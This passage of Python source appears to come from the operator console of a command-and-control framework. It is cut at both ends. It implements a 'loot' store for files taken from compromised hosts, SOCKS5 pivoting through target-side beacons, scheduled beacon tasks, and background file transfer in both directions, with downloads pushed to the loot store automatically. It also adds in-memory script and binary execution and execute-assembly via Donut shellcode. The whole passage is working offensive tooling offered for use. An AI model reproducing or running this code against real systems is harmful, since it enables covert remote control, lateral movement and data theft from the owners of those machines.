            src = f.get('source_path', '') or ''
            bid = int(f.get('source_beacon', 0) or 0)
            when = time.strftime(
                '%Y-%m-%d %H:%M',
                time.localtime(ts)) if ts else '?'
            print(f"  {c['cyan']}{h}{c['reset']}")
            print(f"    {c['bold']}{nm:<32}{c['reset']}  "
                  f"{sz:>8}  "
                  f"{c['dim']}{owner:<14} {when}"
                  f"{c['reset']}")
            if src or bid:
                bid_str = f"#{bid}" if bid else '—'
                print(f"    {c['dim']}from {bid_str}  "
                      f"{src or '(unknown path)'}{c['reset']}")
        print()
        print(f"  {c['dim']}loot get <sha256>  to download"
              f"{c['reset']}")
        print()

    def _loot_get(self, digest, out_path):
        c = CLR
        if out_path is None:
            out_path = digest
        try:
            r = self.tp.post('/api/v1/loot/download',
                             {'sha256': digest},
                             timeout=300.0)
        except Exception as exc:
            print(f"{c['red']}loot get failed: {exc}{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['red']}"
                  f"{r.get('error', 'not found')}{c['reset']}")
            return
        import base64 as _b64
        import hashlib as _hl
        try:
            data = _b64.b64decode(r.get('data_b64') or '')
        except Exception:
            print(f"{c['red']}bad response encoding"
                  f"{c['reset']}")
            return
        got = _hl.sha256(data).hexdigest()
        if got != digest:
            print(f"{c['red']}sha256 mismatch — refusing to write"
                  f"{c['reset']}")
            print(f"  expected: {digest}")
            print(f"  got:      {got}")
            return
        if out_path == digest:
            name = (r.get('name') or '').strip()
            name = name.replace('/', '_').replace('\\', '_')
            if name and name not in ('.', '..'):
                out_path = name
        try:
            with open(out_path, 'wb') as fh:
                fh.write(data)
        except OSError as exc:
            print(f"{c['red']}write failed: {exc}{c['reset']}")
            return
        print(f"{c['green']}✓{c['reset']} saved "
              f"{c['cyan']}{out_path}{c['reset']} "
              f"({_human_bytes(len(data))})")
        src = r.get('source_path') or ''
        bid = int(r.get('source_beacon', 0) or 0)
        if src or bid:
            bid_str = f"#{bid}" if bid else '—'
            print(f"  {c['dim']}from {bid_str}  "
                  f"{src or '(unknown path)'}{c['reset']}")

    def _loot_delete(self, digest):
        c = CLR
        try:
            r = self.tp.post('/api/v1/loot/delete',
                             {'sha256': digest},
                             timeout=30.0)
        except Exception as exc:
            print(f"{c['red']}loot delete failed: {exc}"
                  f"{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['red']}"
                  f"{r.get('error', 'delete failed')}{c['reset']}")
            return
        print(f"{c['green']}✓{c['reset']} deleted "
              f"sha256:{digest[:12]}… "
              f"({_human_bytes(r.get('size', 0))})")
        if r.get('overrode'):
            owner = r.get('owner') or '(no owner on record)'
            print(f"  {c['yellow']}admin override — this loot "
                  f"belonged to {owner}{c['reset']}")
            print(f"  {c['dim']}the audit chain records this "
                  f"deletion under your name{c['reset']}")

    # ------------------------------------------------------------------
    # SOCKS5 pivot control

    def _cmd_socks(self, parts):
        """socks [start <port> | stop | status]

        Runs a SOCKS5 proxy on the operator's own 127.0.0.1. Each
        connection is tunnelled to the team server, which bridges it
        to a beacon dial-back. From the tool's point of view this is
        a normal local SOCKS5 proxy.
        """
        sub = parts[1].lower() if len(parts) > 1 else 'status'

        if sub in ('status', 'show', 'info'):
            if self._socks_proxy is None:
                print(f"{CLR['dim']}no local SOCKS proxy running"
                      f"{CLR['reset']}")
                return
            print(f"{CLR['green']}✓{CLR['reset']} SOCKS5 proxy on "
                  f"{CLR['cyan']}127.0.0.1:{self._socks_proxy.port}"
                  f"{CLR['reset']} for beacon "
                  f"{CLR['cyan']}#{self.current_beacon}{CLR['reset']}")
            return

        if sub == 'start':
            if len(parts) < 3:
                print(f"{CLR['red']}usage: socks start <port>"
                      f"{CLR['reset']}")
                return
            try:
                port = int(parts[2])
            except ValueError:
                print(f"{CLR['red']}invalid port{CLR['reset']}")
                return
            if not (1 <= port <= 65535):
                print(f"{CLR['red']}port out of range{CLR['reset']}")
                return
            if self._socks_proxy is not None:
                print(f"{CLR['red']}a SOCKS proxy is already running "
                      f"on 127.0.0.1:{self._socks_proxy.port}"
                      f"{CLR['reset']}")
                return
            if not self.client_tunnel_port:
                print(f"{CLR['red']}server did not advertise a "
                      f"client-tunnel port. Restart the handler — "
                      f"this server does not support client-side "
                      f"SOCKS.{CLR['reset']}")
                return
            from . import socks_proxy as _sp
            proxy = _sp.SocksProxy(
                '127.0.0.1', port, self.cfg,
                self.current_beacon, self.client_tunnel_port)
            ok, err = proxy.start()
            if not ok:
                print(f"{CLR['red']}could not bind "
                      f"127.0.0.1:{port}: {err}{CLR['reset']}")
                return
            self._socks_proxy = proxy
            print(f"{CLR['green']}✓{CLR['reset']} SOCKS5 proxy "
                  f"listening on "
                  f"{CLR['cyan']}127.0.0.1:{port}{CLR['reset']} "
                  f"for beacon "
                  f"{CLR['cyan']}#{self.current_beacon}{CLR['reset']}")
            print(f"  {CLR['dim']}point your tools at "
                  f"--socks5 127.0.0.1:{port}{CLR['reset']}")
            print(f"  {CLR['dim']}the tunnel goes through the team "
                  f"server; the beacon dials back from the "
                  f"target{CLR['reset']}")
            return

        if sub == 'stop':
            if self._socks_proxy is None:
                print(f"{CLR['yellow']}no SOCKS proxy running"
                      f"{CLR['reset']}")
                return
            self._socks_proxy.stop()
            self._socks_proxy = None
            print(f"{CLR['green']}✓{CLR['reset']} SOCKS proxy stopped")
            return

        print(f"{CLR['red']}usage: socks [start <port> | stop | "
              f"status]{CLR['reset']}")

    # ------------------------------------------------------------------
    # Session management handlers

    def _cmd_beacon_info(self):
        """info — show the attached beacon's identity and scheduling."""
        bid = self.current_beacon
        try:
            beacons = self.tp.post('/api/v1/beacons', {})
        except Exception as exc:
            print(f"{CLR['red']}info fetch failed: {exc}{CLR['reset']}")
            return
        b = next((x for x in beacons if x['id'] == bid), None)
        if b is None:
            print(f"{CLR['red']}beacon #{bid} not in registry"
                  f"{CLR['reset']}")
            return

        c = CLR
        _header(f'BEACON #{bid}')
        rows = [
            ('display',   b.get('display_name', '?')),
            ('os/arch',   f"{b.get('os','?')}/{b.get('arch','')}"),
            ('address',   b.get('last_addr', '') or '—'),
            ('sleep',     f"{b.get('sleep_interval', 0)}s "
                          f"(jitter {b.get('jitter', 0.0):.2f})"),
            ('last seen', f"{b.get('last_seen_age', 0)}s ago"),
            ('check-ins', str(b.get('checkins', 0))),
            ('alive',     'yes' if b.get('alive') else 'no'),
        ]
        for label, value in rows:
            print(f"  {c['dim']}{label:<12}{c['reset']}{value}")
        print()

    def _cmd_graph(self, parts):
        """graph [tree|flat|summary|path <a> <b>]"""
        sub = parts[1].lower() if len(parts) > 1 else 'tree'
        payload = {'mode': sub}
        if sub == 'path' and len(parts) >= 4:
            try:
                payload['src'] = int(parts[2])
                payload['dst'] = int(parts[3])
            except ValueError:
                print(f"{CLR['red']}path ids must be integers"
                      f"{CLR['reset']}")
                return

        try:
            r = self.tp.post('/api/v1/graph', payload)
        except Exception as exc:
            print(f"{CLR['red']}graph fetch failed: {exc}"
                  f"{CLR['reset']}")
            return

        text = (r.get('text') or '').rstrip()
        if not text:
            print(f"  {CLR['dim']}(empty graph){CLR['reset']}")
            return
        print()
        print(text)
        print()

    def _cmd_forget(self):
        """forget — remove the beacon from the registry."""
        bid = self.current_beacon
        try:
            answer = input(
                f"{CLR['yellow']}Forget beacon #{bid}? "
                f"Its task history and fingerprint are lost. "
                f"[y/N]: {CLR['reset']}"
            ).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if answer not in ('y', 'yes'):
            print(f"{CLR['cyan']}cancelled{CLR['reset']}")
            return
        try:
            r = self.tp.post(
                f'/api/v1/beacon/{bid}/forget', {})
        except Exception as exc:
            print(f"{CLR['red']}forget failed: {exc}{CLR['reset']}")
            return
        if r.get('ok'):
            print(f"{CLR['green']}✓ beacon #{bid} forgotten"
                  f"{CLR['reset']}")
            self.current_beacon = None
        else:
            print(f"{CLR['red']}server refused: "
                  f"{r.get('error', 'unknown')}{CLR['reset']}")

    def _cmd_tasks(self):
        """tasks — list outstanding tasks for the attached beacon.

        Handles both the rich form (dict per task, with verb,
        args, queue time, queued_by) and the older bare-id form,
        so the client keeps working against an older server.
        """
        c = CLR
        bid = self.current_beacon
        try:
            r = self.tp.post(
                f'/api/v1/beacon/{bid}/tasks', {})
        except Exception as exc:
            print(f"{c['red']}tasks fetch failed: {exc}"
                  f"{c['reset']}")
            return
        rows = r.get('pending') or []
        if not rows:
            print(f"  {c['dim']}no outstanding tasks"
                  f"{c['reset']}")
            return

        sleep_s = 0
        for b in getattr(self, '_beacon_cache', []):
            if b.get('id') == bid:
                sleep_s = int(b.get('sleep_interval') or 0)
                break

        now = time.time()
        _header(f'PENDING  ·  {len(rows)} task(s)')
        for t in rows:
            if isinstance(t, str):
                print(f"  {c['cyan']}{t}{c['reset']}")
                continue
            tid = t.get('id', '?')
            verb = t.get('verb', '?')
            args = t.get('args') or []
            by = t.get('queued_by') or '?'
            qt = t.get('queued_at') or 0
            ago = int(now - qt) if qt else 0
            eta = max(0, sleep_s - ago) if sleep_s else 0
            arg_str = ' '.join(str(a) for a in args)
            if len(arg_str) > 40:
                arg_str = arg_str[:37] + '...'
            print(f"  {c['cyan']}{tid}{c['reset']}  "
                  f"{verb:<10} {arg_str:<42} "
                  f"{c['dim']}queued {ago}s ago by {by}, "
                  f"next ~{eta}s{c['reset']}")
        print()

    def _cmd_wait(self, parts):
        """wait [task-id] — poll until a task completes, or all do."""
        bid = self.current_beacon
        target = parts[1] if len(parts) > 1 else None
        started = time.time()
        cap = 300
        last_count = -1
        while time.time() - started < cap:
            try:
                r = self.tp.post(
                    f'/api/v1/beacon/{bid}/tasks', {})
            except Exception as exc:
                print(f"{CLR['red']}wait poll failed: {exc}"
                      f"{CLR['reset']}")
                return
            ids = r.get('pending') or []
            if target:
                if target not in ids:
                    print(f"{CLR['green']}✓ {target} complete"
                          f"{CLR['reset']}")
                    return
                if len(ids) != last_count:
                    print(f"{CLR['dim']}waiting for {target} "
                          f"({len(ids)} still pending)"
                          f"{CLR['reset']}")
                    last_count = len(ids)
            else:
                if not ids:
                    print(f"{CLR['green']}✓ all tasks complete"
                          f"{CLR['reset']}")
                    return
                if len(ids) != last_count:
                    print(f"{CLR['dim']}waiting — {len(ids)} "
                          f"pending{CLR['reset']}")
                    last_count = len(ids)
            time.sleep(1.0)
        print(f"{CLR['yellow']}wait timed out after {cap}s"
              f"{CLR['reset']}")

    def _cmd_schedule(self, parts):
        """schedule add <N><u> <verb> [args] [--keep N]
                     | list | remove <id>
                     | output <id> [<run>]"""
        c = CLR
        bid = self.current_beacon
        sub = parts[1].lower() if len(parts) > 1 else 'list'

        if sub == 'list':
            try:
                r = self.tp.post(
                    f'/api/v1/beacon/{bid}/schedule',
                    {'op': 'list'})
            except Exception as exc:
                print(f"{c['red']}schedule fetch failed: {exc}"
                      f"{c['reset']}")
                return
            entries = r.get('schedules') or []
            if not entries:
                print(f"  {c['dim']}no schedules for "
                      f"#{bid}{c['reset']}")
                return
            _header(f'SCHEDULES  ·  beacon #{bid}')
            for s in entries:
                left = max(0, int(s.get('next_in', 0)))
                keep = int(s.get('keep') or 0)
                outs = int(s.get('outputs') or 0)
                extra = ''
                if keep:
                    extra = (f"  {c['dim']}keep={keep} "
                             f"stored={outs}{c['reset']}")
                print(f"  {c['green']}{s['id']}{c['reset']}  "
                      f"every {s['interval']}s  "
                      f"next in {left}s  "
                      f"runs={s['runs']}  "
                      f"{c['cyan']}{s['verb']} "
                      f"{' '.join(s.get('args', []))}"
                      f"{c['reset']}{extra}")
            print()
            return

        if sub in ('remove', 'rm'):
            if len(parts) < 3:
                print(f"{c['red']}usage: schedule remove <id>"
                      f"{c['reset']}")
                return
            try:
                r = self.tp.post(
                    f'/api/v1/beacon/{bid}/schedule',
                    {'op': 'remove', 'id': parts[2]})
            except Exception as exc:
                print(f"{c['red']}remove failed: {exc}"
                      f"{c['reset']}")
                return
            if r.get('ok'):
                print(f"{c['green']}✓ removed {parts[2]}"
                      f"{c['reset']}")
            else:
                print(f"{c['red']}{r.get('error', 'failed')}"
                      f"{c['reset']}")
            return

        if sub == 'add':
            keep = 0
            positional = [parts[0], parts[1]]
            i = 2
            while i < len(parts):
                if parts[i] == '--keep' and i + 1 < len(parts):
                    try:
                        keep = max(0, min(int(parts[i + 1]), 10000))
                    except ValueError:
                        pass
                    i += 2
                else:
                    positional.append(parts[i])
                    i += 1
            if len(positional) < 4:
                print(f"{c['red']}usage: schedule add "
                      f"<30s|5m|2h|1d> <verb> [args...] "
                      f"[--keep N]{c['reset']}")
                return
            try:
                r = self.tp.post(
                    f'/api/v1/beacon/{bid}/schedule',
                    {'op': 'add',
                     'interval': positional[2],
                     'verb': positional[3],
                     'args': positional[4:],
                     'keep': keep})
            except Exception as exc:
                print(f"{c['red']}add failed: {exc}"
                      f"{c['reset']}")
                return
            if r.get('ok'):
                extra = (f" keep={keep}" if keep else "")
                print(f"{c['green']}✓ schedule {r['id']} added: "
                      f"every {r['interval']}s {positional[3]} "
                      f"{' '.join(positional[4:])}{extra}"
                      f"{c['reset']}")
            else:
                print(f"{c['red']}{r.get('error', 'failed')}"
                      f"{c['reset']}")
            return

        if sub in ('output', 'out'):
            if len(parts) < 3:
                print(f"{c['red']}usage: schedule output <id> "
                      f"[<run>]{c['reset']}")
                return
            payload = {'op': 'output', 'id': parts[2]}
            if len(parts) > 3:
                try:
                    payload['run'] = int(parts[3])
                except ValueError:
                    pass
            try:
                r = self.tp.post(
                    f'/api/v1/beacon/{bid}/schedule', payload)
            except Exception as exc:
                print(f"{c['red']}{exc}{c['reset']}")
                return
            outs = r.get('outputs') or []
            if not outs:
                print(f"  {c['dim']}(no outputs stored)"
                      f"{c['reset']}")
                return
            for o in outs:
                run = o.get('run', '?')
                ts = time.strftime(
                    '%Y-%m-%d %H:%M:%S',
                    time.localtime(o.get('ts', 0)))
                try:
                    text = _b64.b64decode(
                        o.get('output_b64') or ''
                    ).decode('utf-8', errors='replace')
                except Exception:
                    text = '<decode error>'
                _header(f'RUN #{run}  ·  {ts}')
                if o.get('error'):
                    print(f"  {c['red']}{o['error']}"
                          f"{c['reset']}")
                if text:
                    print(text.rstrip())
                print()
            return

        print(f"{c['red']}usage: schedule "
              f"<add|list|remove|output>{c['reset']}")

    # ------------------------------------------------------------------
    # Chunked upload

    def _cmd_upload(self, parts):
        """upload <local_path> <remote_path>

        Starts a background transfer and returns immediately.
        Chunk-level progress is suppressed — use `jobs` to check
        status on demand. The completion line prints when the job
        finishes, without blocking the prompt.
        """
        if len(parts) < 3:
            print(f"{CLR['red']}usage: upload <local> <remote>"
                  f"{CLR['reset']}")
            return
        local_path, remote_path = parts[1], parts[2]

        if not os.path.isfile(local_path):
            print(f"{CLR['red']}local file not found: {local_path}"
                  f"{CLR['reset']}")
            return
        size = os.path.getsize(local_path)
        if size == 0:
            print(f"{CLR['red']}file is empty{CLR['reset']}")
            return

        print(f"{CLR['cyan']}[*]{CLR['reset']} hashing "
              f"{local_path} ({_human_bytes(size)})…")
        h = hashlib.sha256()
        try:
            with open(local_path, 'rb') as fh:
                for block in iter(lambda: fh.read(1 << 20), b''):
                    h.update(block)
        except OSError as exc:
            print(f"{CLR['red']}read error: {exc}{CLR['reset']}")
            return
        local_hex = h.hexdigest()

        job = _TransferJob(
            client=self, direction='upload',
            local_path=local_path, remote_path=remote_path,
            digest=local_hex, size=size,
            beacon_id=self.current_beacon)
        self._transfers[job.id] = job
        print(f"{CLR['cyan']}▸{CLR['reset']} "
              f"upload {CLR['bold']}{job.id}{CLR['reset']} "
              f"started in background")
        print(f"  {CLR['dim']}{local_path} → {remote_path}"
              f"{CLR['reset']}")
        print(f"  {CLR['dim']}{_human_bytes(size)}, "
              f"sha256 {local_hex[:16]}…{CLR['reset']}")
        print(f"  {CLR['dim']}`jobs` to check status; the prompt "
              f"stays live{CLR['reset']}")
        job.start()

    # ------------------------------------------------------------------
    # Chunked download

    def _cmd_download(self, parts):
        """download <remote_path> <local_path> [--no-loot]

        Starts a background transfer and returns immediately.
        On a verified download, the file is also pushed to the
        server-side loot store under its SHA-256. Pass --no-loot
        for a private download that stays off the store.
        """
        no_loot = False
        rest = []
        for arg in parts[1:]:
            if arg == '--no-loot':
                no_loot = True
            else:
                rest.append(arg)
        if len(rest) < 2:
            print(f"{CLR['red']}usage: download <remote> <local> "
                  f"[--no-loot]{CLR['reset']}")
            return
        remote_path, local_path = rest[0], rest[1]

        print(f"{CLR['cyan']}[*]{CLR['reset']} fetching size of "
              f"{remote_path}…")
        out, err, _ = self._send_and_wait(
            'filesize', [remote_path], timeout=60, quiet=True)
        if err:
            print(f"{CLR['red']}filesize failed: {err}{CLR['reset']}")
            return
        try:
            total_bytes = int((out or b'').decode(
                'ascii', errors='replace').strip())
        except (ValueError, AttributeError):
            print(f"{CLR['red']}could not parse remote size"
                  f"{CLR['reset']}")
            return

        if total_bytes == 0:
            print(f"{CLR['dim']}remote file is empty — creating "
                  f"empty local copy{CLR['reset']}")
            try:
                with open(local_path, 'wb'):
                    pass
            except OSError as exc:
                print(f"{CLR['red']}write failed: {exc}"
                      f"{CLR['reset']}")
            return

        job = _TransferJob(
            client=self, direction='download',
            local_path=local_path, remote_path=remote_path,
            digest='', size=total_bytes,
            beacon_id=self.current_beacon,
            no_loot=no_loot)
        self._transfers[job.id] = job
        print(f"{CLR['cyan']}▸{CLR['reset']} "
              f"download {CLR['bold']}{job.id}{CLR['reset']} "
              f"started in background")
        print(f"  {CLR['dim']}{remote_path} → {local_path}"
              f"{CLR['reset']}")
        print(f"  {CLR['dim']}{_human_bytes(total_bytes)}"
              f"{CLR['reset']}")
        if not no_loot:
            print(f"  {CLR['dim']}on success, pushed to the loot "
                  f"store automatically{CLR['reset']}")
        print(f"  {CLR['dim']}`jobs` to check status; the prompt "
              f"stays live{CLR['reset']}")
        job.start()

    # ------------------------------------------------------------------
    # Loot auto-upload

    def _loot_store_upload(self, local_path, source_path, digest,
                           display_name=None):
        """Push a file to the server's loot store.

        Streams the file in chunks so arbitrarily large loot
        works — the only ceilings are the server's
        MAX_TOTAL_BYTES and free disk. A file under
        SMALL_FILE_THRESHOLD is sent in a single POST, which is
        one round trip instead of many; everything larger goes
        through the chunked path.

        `display_name`, when given, is what the store records as
        the file's name. When None, the basename of `local_path`
        is used. Called from `download` with no override (the
        download's local save path is the natural name) and from
        `lootstore upload` with whatever the operator typed.

        Best-effort when called from `download`: a failure here
        does not fail the download, which has already completed
        and been verified. The operator still has the file
        locally.
        """
        c = CLR
        try:
            size = os.path.getsize(local_path)
        except OSError as exc:
            print(f"{c['dim']}loot: stat failed: {exc}"
                  f"{c['reset']}")
            return
        if size == 0:
            return

        SMALL_FILE_THRESHOLD = 16 * 1024 * 1024
        if size <= SMALL_FILE_THRESHOLD:
            self._loot_store_upload_single(
                local_path, source_path, digest, size,
                display_name=display_name)
            return

        name = display_name or os.path.basename(local_path)
        try:
            r = self.tp.post('/api/v1/loot/upload/init', {
                'sha256':        digest,
                'total_size':    size,
                'name':          name,
                'source_path':   source_path,
                'source_beacon': self.current_beacon or 0,
            }, timeout=30.0)
        except Exception as exc:
            print(f"{c['yellow']}loot: init failed: {exc}"
                  f"{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['yellow']}loot: "
                  f"{r.get('error', 'server refused')}"
                  f"{c['reset']}")
            return
        if r.get('deduped'):
            print(f"{c['green']}✓{c['reset']} loot already in "
                  f"store ({_human_bytes(r.get('size', size))}) — "
                  f"share by {c['cyan']}sha256:{digest}"
                  f"{c['reset']}")
            return

        upload_id = r.get('upload_id')
        if not upload_id:
            print(f"{c['yellow']}loot: server returned no "
                  f"upload_id{c['reset']}")
            return
        chunk_size = int(r.get('chunk_size') or (4 * 1024 * 1024))

        started = time.time()
        offset = 0
        show_progress = size > 32 * 1024 * 1024
        try:
            with open(local_path, 'rb') as fh:
                while offset < size:
                    block = fh.read(chunk_size)
                    if not block:
                        break
                    b64 = _b64.b64encode(block).decode('ascii')
                    try:
                        cr = self.tp.post(
                            '/api/v1/loot/upload/chunk', {
                                'upload_id': upload_id,
                                'offset':    offset,
                                'data_b64':  b64,
                            }, timeout=300.0)
                    except Exception as exc:
                        self._loot_abort(upload_id)
                        if show_progress:
                            print()
                        print(f"{c['yellow']}loot: chunk at "
                              f"{offset} failed: {exc}"
                              f"{c['reset']}")
                        return
                    if not cr.get('ok'):
                        self._loot_abort(upload_id)
                        if show_progress:
                            print()
                        print(f"{c['yellow']}loot: "
                              f"{cr.get('error', 'chunk rejected')}"
                              f"{c['reset']}")
                        return
                    offset = int(cr.get('offset',
                                        offset + len(block)))
                    if show_progress and sys.stdout.isatty():
                        pct = int(100 * offset / size) if size else 100
                        print(f"\r{c['dim']}loot: {pct}% "
                              f"({_human_bytes(offset)} / "
                              f"{_human_bytes(size)})"
                              f"{c['reset']}",
                              end='', flush=True)
        except OSError as exc:
            self._loot_abort(upload_id)
            if show_progress:
                print()
            print(f"{c['yellow']}loot: read failed: {exc}"
                  f"{c['reset']}")
            return
        if show_progress:
            print()

        try:
            fr = self.tp.post('/api/v1/loot/upload/finish', {
                'upload_id': upload_id,
            }, timeout=900.0)
        except Exception as exc:
            print(f"{c['yellow']}loot: finish failed: {exc}"
                  f"{c['reset']}")
            return
        if not fr.get('ok'):
            print(f"{c['yellow']}loot: "
                  f"{fr.get('error', 'server refused')}"
                  f"{c['reset']}")
            return
        elapsed = time.time() - started
        dedup = ' (already in store)' if fr.get('deduped') else ''
        print(f"{c['green']}✓{c['reset']} loot stored{dedup} "
              f"({_human_bytes(size)}, {elapsed:.1f}s) — "
              f"share by {c['cyan']}sha256:{digest}{c['reset']}")

    def _loot_store_upload_single(self, local_path, source_path,
                                  digest, size,
                                  display_name=None):
        """Single-POST fast path for small files. Same shape as
        the pre-chunked-upload code."""
        c = CLR
        try:
            with open(local_path, 'rb') as fh:
                blob = fh.read()
        except OSError as exc:
            print(f"{c['dim']}loot: read failed: {exc}"
                  f"{c['reset']}")
            return
        b64 = _b64.b64encode(blob).decode('ascii')
        name = display_name or os.path.basename(local_path)
        try:
            r = self.tp.post('/api/v1/loot/upload', {
                'sha256':        digest,
                'name':          name,
                'source_path':   source_path,
                'source_beacon': self.current_beacon or 0,
                'data_b64':      b64,
            }, timeout=600.0)
        except Exception as exc:
            print(f"{c['yellow']}loot: upload failed: {exc}"
                  f"{c['reset']}")
            return
        if not r.get('ok'):
            print(f"{c['yellow']}loot: "
                  f"{r.get('error', 'server refused')}"
                  f"{c['reset']}")
            return
        dedup = ' (already in store)' if r.get('deduped') else ''
        print(f"{c['green']}✓{c['reset']} loot stored{dedup} "
              f"({_human_bytes(size)}) — "
              f"share by {c['cyan']}sha256:{digest}{c['reset']}")

    def _loot_abort(self, upload_id):
        try:
            self.tp.post('/api/v1/loot/upload/abort',
                         {'upload_id': upload_id}, timeout=10.0)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Footer

    def _footer(self, verb: str, started: float,
                success: bool = True) -> None:
        """One-line summary after a multi-step operation.

        Format: [15:42:18]  #1001  upload  ✓  3.2s

        Wall clock plus target beacon means a scrollback of the
        terminal reads coherently on its own — no need to
        reconstruct which command hit which host.
        """
        c = CLR
        ts = time.strftime('%H:%M:%S')
        elapsed = time.time() - started
        mark = (f"{c['green']}✓{c['reset']}" if success
                else f"{c['red']}✗{c['reset']}")
        bid = self.current_beacon or '—'
        print(f"{c['dim']}[{ts}]  #{bid}  {verb}  {c['reset']}"
              f"{mark}  {c['dim']}{elapsed:.2f}s{c['reset']}")


    # ------------------------------------------------------------------
    # Background transfer completion + status

    def _transfer_done(self, job, success, error=None):
        """Called from a transfer worker when the job finishes.

        Uses the same clear-then-print trick as the result poller
        so the completion line does not land in the middle of
        whatever the operator is typing. The lock is taken so
        chat and task-result renderers do not interleave.

        On a successful download and unless the operator passed
        --no-loot, the file is pushed to the loot store from a
        second background thread so the completion line is not
        delayed by the push."""
        elapsed = time.time() - job.started
        c = CLR

        with _CHAT_OUTPUT_LOCK:
            is_tty = _COLOR and sys.stdout.isatty()
            if is_tty:
                try:
                    sys.stdout.write('\r\033[K')
                    sys.stdout.flush()
                except Exception:
                    pass

            if success:
                if job.direction == 'upload':
                    target = job.remote_path
                else:
                    target = job.local_path
                print(f"{c['green']}✓{c['reset']} "
                      f"{c['cyan']}{job.direction}{c['reset']} "
                      f"{c['bold']}{job.id}{c['reset']}  "
                      f"{target}  "
                      f"{c['dim']}({_human_bytes(job.size)}, "
                      f"{elapsed:.1f}s){c['reset']}")
                if job.direction == 'download' and job.digest:
                    print(f"  {c['dim']}sha256: {job.digest}"
                          f"{c['reset']}")
            else:
                print(f"{c['red']}✗ {job.direction}{c['reset']} "
                      f"{c['bold']}{job.id}{c['reset']}  "
                      f"{c['dim']}({elapsed:.1f}s){c['reset']}")
                if error:
                    for line in str(error).splitlines():
                        print(f"  {c['red']}{line}{c['reset']}")

        # Loot push runs after the completion line has printed,
        # so a slow store does not hold the terminal.
        if (success
                and job.direction == 'download'
                and job.digest
                and not job.no_loot):
            threading.Thread(
                target=self._loot_store_upload,
                args=(job.local_path, job.remote_path,
                      job.digest),
                name=f'loot-{job.id}',
                daemon=True).start()

    def _cmd_jobs(self, parts):
        """jobs          list active transfers
           jobs kill <id> cancel a transfer"""
        c = CLR
        if len(parts) > 1 and parts[1].lower() in (
                'kill', 'cancel', 'stop'):
            if len(parts) < 3:
                print(f"{c['red']}usage: jobs kill <id>"
                      f"{c['reset']}")
                return
            job = self._transfers.get(parts[2])
            if job is None:
                print(f"{c['red']}no such job: {parts[2]}"
                      f"{c['reset']}")
                return
            job.cancel()
            print(f"{c['green']}✓{c['reset']} cancel requested "
                  f"for {c['cyan']}{parts[2]}{c['reset']}")
            return

        if not self._transfers:
            print(f"  {c['dim']}(no background transfers)"
                  f"{c['reset']}")
            return

        _header(f'TRANSFERS  ·  {len(self._transfers)}')
        for jid, job in sorted(self._transfers.items()):
            snap = job.snapshot()
            pct = (100 * snap['done'] // snap['size']
                   if snap['size'] else 0)
            target = (snap['local'] if snap['direction'] == 'download'
                      else snap['remote'])
            other = (snap['remote'] if snap['direction'] == 'download'
                     else snap['local'])
            print(f"  {c['cyan']}{jid}{c['reset']}  "
                  f"{snap['direction']:<8} "
                  f"{target}")
            print(f"    {c['dim']}{other}{c['reset']}")
            print(f"    {c['dim']}{pct:>3}%  "
                  f"{_human_bytes(snap['done'])} / "
                  f"{_human_bytes(snap['size'])}  "
                  f"{snap['chunks']}/{snap['total']} chunks  "
                  f"{snap['elapsed']:.1f}s{c['reset']}")
        print()
        print(f"  {c['dim']}jobs kill <id>  to cancel a transfer"
              f"{c['reset']}")
        print()

    # ------------------------------------------------------------------
    # In-memory script execution

    def _dispatch_script(self, verb, args):
        """pyexec / psexec / shexec — read local file, base64, dispatch.

        A first argument of `--stdin` reads the script from the
        operator's terminal instead, up to a line containing only
        a single '.'. The pasted text is delivered to the target
        exactly as if it had come from a file.
        """
        if not args:
            print(f"{CLR['red']}usage: {verb} <local_file> "
                  f"[-- args...]  |  {verb} --stdin [-- args...]"
                  f"{CLR['reset']}")
            return
        if args[0] == '--stdin':
            text = self._read_multiline()
            if text is None:
                print(f"{CLR['dim']}cancelled{CLR['reset']}")
                return
            raw = text.encode('utf-8')
            rest = args[1:]
            if rest and rest[0] != '--':
                rest = ['--'] + rest
            b64 = _b64.b64encode(raw).decode('ascii')
            self._dispatch_task([verb, b64] + rest)
            return
        local_path = args[0]
        if not os.path.isfile(local_path):
            print(f"{CLR['red']}local file not found: {local_path}"
                  f"{CLR['reset']}")
            return
        size = os.path.getsize(local_path)
        if size == 0:
            print(f"{CLR['red']}file is empty{CLR['reset']}")
            return
        if size > MAX_INLINE_SCRIPT:
            print(f"{CLR['red']}file too large for inline delivery "
                  f"({size} > {MAX_INLINE_SCRIPT}){CLR['reset']}")
            return
        try:
            with open(local_path, 'rb') as fh:
                raw = fh.read()
        except OSError as exc:
            print(f"{CLR['red']}read error: {exc}{CLR['reset']}")
            return

        b64 = _b64.b64encode(raw).decode('ascii')
        rest = args[1:]
        if rest and rest[0] != '--':
            rest = ['--'] + rest
        self._dispatch_task([verb, b64] + rest)

    # ------------------------------------------------------------------
    # execmem

    def _cmd_execmem(self, parts):
        """execmem <remote> exe|elf [-- args]"""
        if len(parts) < 3:
            print(f"{CLR['red']}usage: execmem <remote> exe|elf "
                  f"[-- args...]{CLR['reset']}")
            return
        remote = parts[1]
        kind = parts[2].lower()
        if kind not in ('exe', 'elf'):
            print(f"{CLR['red']}kind must be 'exe' or 'elf'"
                  f"{CLR['reset']}")
            return
        rest = parts[3:]
        if rest and rest[0] == '--':
            rest = rest[1:]
        self._dispatch_task(
            ['execmem', remote, kind] + rest)

    def _cmd_execute_assembly(self, parts):
        """execute-assembly <local.exe> [-- args...]

        The server runs Donut on the local assembly and dispatches
        the resulting shellcode. The client only uploads the file
        path via the task payload — the assembly bytes never leave
        the operator machine, because Donut runs on the server.
        """
        if len(parts) < 2:
            print(f"{CLR['red']}usage: execute-assembly <local.exe> "
                  f"[-- args...]{CLR['reset']}")
            return
        local_path = parts[1]
        if not os.path.isfile(local_path):
            print(f"{CLR['red']}local file not found: {local_path}"
                  f"{CLR['reset']}")
            return
        try:
            with open(local_path, 'rb') as fh:
                blob = fh.read()
        except OSError as exc:
            print(f"{CLR['red']}read error: {exc}{CLR['reset']}")
            return

        MAX_ASSEMBLY_BYTES = 20 * 1024 * 1024
        if len(blob) > MAX_ASSEMBLY_BYTES:
            print(f"{CLR['red']}assembly too large for inline "
                  f"delivery (max {MAX_ASSEMBLY_BYTES // (1024*1024)}"
                  f" MiB). Upload it first, then use "
                  f"`execmem <remote> exe`.{CLR['reset']}")
            return

